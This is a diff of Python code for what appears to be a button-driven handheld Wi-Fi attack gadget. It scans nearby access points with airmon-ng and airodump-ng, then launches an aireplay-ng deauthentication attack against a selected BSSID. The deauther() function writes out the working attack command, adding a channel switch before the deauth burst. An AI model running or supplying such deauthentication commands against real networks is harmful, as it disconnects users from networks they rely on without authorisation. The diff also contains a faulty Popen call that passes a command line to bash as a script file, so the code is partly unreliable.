@@ -1409,6 +1409,7 @@ def vulnerabilityScan():
 
 
 def getSSID():
+    DisplayText("","","wait","","","","")
     #list wifi APs
     cmd ="airmon-ng start wlan0 && airmon-ng start wlan0mon"
     res = execcmd(cmd)
@@ -1417,10 +1418,10 @@ def getSSID():
         return()
     try:
         #Popen(['nohup','/bin/bash','/root/BeBoXGui/update.sh'], stdout=open('/dev/null','w'), stderr=open('/dev/null','a'),>
-        Popen(['nohup','/bin/bash','test.sh'],preexec_fn=os.setpgrp)
+        Popen(['nohup','/bin/bash','airodump-ng wlan0mon -w reportAiro -a'],preexec_fn=os.setpgrp)
         DisplayText("","","wait","","","","")
         time.sleep(10)
-        cmd = "ps -aux | grep 'airodump-ng wlan0mon -w reportAiro -a-' | head -n 1 | cut -d ' ' -f7"
+        cmd = "ps -aux | grep 'airodump-ng wlan0mon -w reportAiro -a' | head -n 1 | cut -d ' ' -f7"
         res = execcmd(cmd)
         if(res==-1):
             displayError()
@@ -1449,9 +1450,9 @@ def getSSID():
         res[i] = res[i].split(",")
         del res[i][-1]
         res[i]=res[i][-1]+ ","+res[i][3] +","+ res[i][0]
-        print(res[i])
+        
     ssidlist=res
-    print(res)
+    print(ssidlist)
 
     #----------------------------------------------------------
     listattack=ssidlist
@@ -1499,6 +1500,8 @@ def getSSID():
             cur = cur + 1
             if cur>maxi-2:
                 cur = maxi-2
+        if GPIO.input(KEY_LEFT_PIN): # button is released
+            menu = 0
         if GPIO.input(KEY_RIGHT_PIN): # button is released
             menu = 1
         else: # button is pressed:
@@ -1519,7 +1522,9 @@ def deauther():
     DisplayText("this will work","for 10 second","","","","","")
     target= target.split(",")
     print(target[2])
-    cmd="aireplay-ng -0 10 -a " + target[2] + " wlan0mon"
+    
+    cmd="iwconfig wlan0mon channel" + str(target[1] )+" && aireplay-ng -0 10 -a " + str(target[2]) + " wlan0mon"
+    print(cmd)
     res = execcmd(cmd)
     if(res==-1):
         displayError()
